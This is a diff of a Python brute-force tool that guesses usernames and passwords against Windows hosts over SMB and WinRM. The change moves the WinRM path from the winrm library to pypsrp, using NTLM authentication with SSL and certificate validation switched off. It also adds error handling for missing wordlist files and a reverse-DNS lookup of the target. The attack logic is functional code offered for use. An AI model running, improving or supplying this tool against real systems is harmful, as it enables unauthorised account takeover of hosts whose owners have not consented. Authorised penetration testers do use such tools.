@@ -1,8 +1,10 @@
 #!/bin/env python3
 
-import winrm
+import pypsrp
+from pypsrp.client import Client
 import smbclient
 import sys
+import socket
 import socket
 
 def brute(ip, user_file, password_file, protocol, verbosity):
@@ -44,12 +46,21 @@ def brute_smb(ip, user, password):
   except:
     return False
 
+#TODO: winrm over 5986
 def brute_winrm(ip, user, password):
-  s = winrm.Session(ip, auth=(user, password))
   try:
-    s.run_cmd('ipconfig')
+    conn = Client(ip,
+                  auth='ntlm',
+                  username=u'{}\\{}'.format(ip, user),
+                  password=password,
+                  ssl=False,
+                  cert_validation=False)
+    conn.execute_ps('hostname')
+
     return True
-  except winrm.exceptions.InvalidCredentialsError:
+  except KeyboardInterrupt: # Do not remove this, I know it's dumb but you will break the function
+    sys.exit(0)
+  except pypsrp.exceptions.AuthenticationError:
     return False
 
 def verify_connection(ip, port):
@@ -74,12 +85,21 @@ def pretty_print(user, password='', mode="default", seq_param=0, file_size=0):
 
   return buffer_len
 
-def read_users_and_passwords(user_file, password_file):
-  with open(user_file, "r") as users_handle, open(password_file, "r") as passwords_handle:
-    users = users_handle.readlines()
-    passwords = passwords_handle.readlines()
-
-  return users, passwords
+def read_users_and_passwords(user_file, password_file):           
+  try:                                                            
+    with open(user_file, "r") as users_handle:                    
+      try:                                                        
+        with open(password_file, "r") as passwords_handle:        
+          users = users_handle.readlines()                        
+          passwords = passwords_handle.readlines()                
+      except FileNotFoundError:                                   
+        print(f"Couldn't find: {password_file}")                  
+        sys.exit(0)                                               
+    return users, passwords                                       
+                                                                  
+  except FileNotFoundError:                                       
+    print(f"Couldn't find: {user_file}")                          
+    sys.exit(0)                                                   
 
 def print_help():
   print("""
@@ -128,6 +148,7 @@ def main():
   if verbosity == "quiet":
     print("This is quiet mode: no output means no hit.")
 
+  ip = socket.gethostbyaddr(ip)[0]
   brute(ip, user_file, password_file, protocol, verbosity)
 
 if __name__ == "__main__":
